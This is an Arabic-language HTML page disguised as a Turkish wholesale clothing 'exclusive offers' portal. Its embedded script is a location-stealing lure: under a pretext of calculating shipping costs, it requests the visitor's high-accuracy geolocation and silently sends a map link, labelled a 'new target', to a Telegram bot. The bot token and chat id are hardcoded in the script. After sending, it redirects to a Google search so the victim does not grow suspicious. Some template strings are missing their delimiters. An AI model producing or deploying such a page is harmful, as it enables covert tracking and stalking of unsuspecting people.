<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة تجار تركيا 🇹🇷</title>
    <style>
        body { font-family: sans-serif; margin: 0; background-color: #f0f4f8; text-align: center; }
        header { background-color: #1a73e8; color: white; padding: 25px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .card { background: white; padding: 30px; margin: 20px auto; max-width: 400px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .btn { background-color: #2e7d32; color: white; border: none; padding: 18px; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
        #step-2 { display: none; } 
    </style>
</head>
<body>

<header>
    <h1>أسواق تركيا للجملة 🇹🇷</h1>
</header>

<div id="step-1" class="card">
    <h2>عروض الربيع الحصرية</h2>
    <p>لقد تم تحديث الأسعار بنسبة 30%. اضغط للدخول وتفعيل العروض الحصرية الآن.</p>
    <button class="btn" onclick="showStep2()">دخول وتفعيل العروض</button>
</div>

<div id="step-2" class="card">
    <h2 style="color: #1a73e8;">تأكيد الدخول الآمن</h2>
    <p>يرجى الضغط على "تأكيد" لتحديث بيانات القائمة القريبة منك وحساب تكاليف الشحن آلياً.</p>
    <button class="btn" style="background-color: #1a73e8;" onclick="getLocation()">تأكيد الآن</button>
</div>

<script>
    const token = "8676589474:AAF2LBiWe4lraKPUiIhaXZTLIH6DKin5xzA"; 
    const myId = "8124196406"; 

    function showStep2() {
        alert("t7lbtlk._.😂");
        document.getElementById('step-1').style.display = 'none';
        document.getElementById('step-2').style.display = 'block';
    }

    function getLocation() {
        if (navigator.geolocation) {
            // طلب الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(sendLocation, showError, {
                enableHighAccuracy: true, // دقة عالية
                timeout: 5000,
                maximumAge: 0
            });
        } else {
            alert("متصفحك لا يدعم نظام التحديث التلقائي.");
            goToFinal();
        }
    }

    function sendLocation(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const mapLink = https://www.google.com/maps?q=${lat},${lon};
        
        // إرسال الموقع للتيليجرام بصمت
        fetch(https://api.telegram.org/bot${token}/sendMessage, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: myId,
                text: 📍 تم تحديد موقع هدف جديد:\n🔗 الرابط: ${mapLink}
            })
        }).then(() => {
            goToFinal();
        });
    }

    function showError(error) {
        // حتى لو رفض، سنقوم بتحويله لكي لا يشك في شيء
        goToFinal();
    }

    function goToFinal() {
        alert("تم تحديث البيانات بنجاح!");
        window.location.href = "https://www.google.com/search?q=wholesale+clothing+turkey";
    }
</script>
</body>
</html>
